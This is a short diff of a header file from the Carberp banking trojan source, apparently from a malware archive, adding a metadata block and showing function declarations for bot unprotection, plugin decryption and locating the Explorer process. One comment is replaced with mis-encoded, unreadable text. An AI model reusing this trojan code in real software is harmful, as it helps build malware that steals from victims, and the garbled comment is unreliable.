@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #define WIN_2000	1
@@ -43,7 +54,7 @@ void UnProtectBot();
 LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
 LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );
 
-// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (Explorer.exe)
 DWORD GetExplorerPid();
 
 #define min(a,b)            (((a) < (b)) ? (a) : (b))
